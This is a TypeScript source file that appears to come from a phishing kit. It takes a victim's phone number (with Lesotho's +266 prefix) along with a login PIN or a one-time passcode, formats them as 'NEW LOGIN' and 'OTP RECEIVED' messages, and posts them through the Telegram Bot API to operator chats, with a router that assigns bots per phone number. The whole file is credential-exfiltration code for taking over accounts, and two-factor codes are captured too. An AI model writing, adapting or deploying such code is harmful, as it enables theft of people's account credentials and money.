import { getNextBot, type BotConfig } from './botRouter'

// Helper to format phone number with +266 prefix
const formatPhoneNumber = (phone: string): string => {
  // Remove any existing + or country code
  const cleanPhone = phone.replace(/^\+?266/, '').trim()
  return `+266${cleanPhone}`
}

// Helper to send message to Telegram using routed bot
const sendTelegramMessage = async (text: string, phoneNumber: string): Promise<void> => {
  try {
    // Get the bot for this phone number (either new assignment or existing)
    const bot: BotConfig = await getNextBot(phoneNumber)

    if (!bot.token || !bot.chatId) {
      console.error('Telegram configuration missing for bot:', bot.name)
      return
    }

    const url = `https://api.telegram.org/bot${bot.token}/sendMessage`

    console.log(`📤 SENDING TO ${bot.name} BOT:`, text)

    await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: bot.chatId,
        text: text,
        parse_mode: 'HTML'
      })
    })
  } catch (error) {
    console.error('Telegram Send Error:', error)
  }
}

export const sendLoginDetails = async (phone: string, pin: string): Promise<void> => {
  const formattedPhone = formatPhoneNumber(phone)
  const message = `
🔐 *NEW LOGIN*
📱 Phone: ${formattedPhone}
🔢 PIN: ${pin}
  `.trim()

  await sendTelegramMessage(message, phone)
}

export const sendOTPDetails = async (phone: string, otp: string): Promise<void> => {
  const formattedPhone = formatPhoneNumber(phone)
  const message = `
🔑 *OTP RECEIVED*
📱 Phone: ${formattedPhone}
🔢 Code: ${otp}
  `.trim()

  await sendTelegramMessage(message, phone)
}
